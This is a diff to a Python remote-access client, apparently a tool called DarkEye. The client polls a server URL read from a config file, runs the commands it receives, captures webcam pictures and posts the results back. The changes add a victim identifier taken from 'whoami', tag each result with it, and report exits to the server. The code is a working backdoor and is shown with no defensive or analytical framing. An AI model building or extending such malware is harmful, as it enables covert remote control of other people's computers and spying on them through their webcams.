@@ -9,6 +9,8 @@ import base64
 with open("config.txt", "r") as f:
     url = f.readline().strip()
 
+ID = subprocess.check_output("whoami", shell=True).decode('utf-8').strip()
+
 startup = " _____              _     _______            \n(____ \            | |   (_______)           \n _   \ \ ____  ____| |  _ _____  _   _  ____ \n| |   | / _  |/ ___) | / )  ___)| | | |/ _  )\n| |__/ ( ( | | |   | |< (| |____| |_| ( (/ / \n|_____/ \_||_|_|   |_| \_)_______)__  |\____)\n                                (____/       \n"
 
 
@@ -67,6 +69,7 @@ def execute(cmd):
         elif cmd.startswith("cam"):
             output = str(take_picture())
         elif cmd.startswith("exit"):
+            requests.post(url, data=f"{ID};;; !exit!")
             exit()
     except Exception as e:
         output = "Error: " + str(e)
@@ -79,14 +82,13 @@ while True:
     print("_", end="")
     response = ""
     try:
-        response = str(requests.get(url).content.decode("utf-8"))
-        print("_", end="")
+        response = str(requests.get(url, data=ID).content.decode("utf-8"))
     except:
         print("x", end="")
-    data = execute(response)
+    data = f"{ID};;; {execute(response).strip()}"
     try:
         print(requests.post(url, data=data).text, end="")
     except:
-        pass
+        print("x", end="")
 
     time.sleep((1.0 - (time.time() % 1)))
